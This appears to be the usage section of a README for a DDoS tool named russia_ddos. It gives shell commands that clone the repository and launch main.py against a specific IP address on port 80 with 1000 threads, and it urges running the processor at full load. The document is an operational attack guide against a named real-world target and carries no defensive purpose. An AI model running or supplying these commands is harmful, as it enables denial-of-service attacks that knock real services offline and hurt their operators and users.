## Usage
Ensure you have Python 3 installed. Then clone this repo and run main.py with params you need:

-s - IP;

-p - port (default 80);

-t - threads count. The most important setting. Try to keep the processor loaded up to 100%.

```bash
git clone https://github.com/alexmon1989/russia_ddos.git
cd russia_ddos
python -u main.py -s 213.24.76.23 -p 80 -t 1000
```
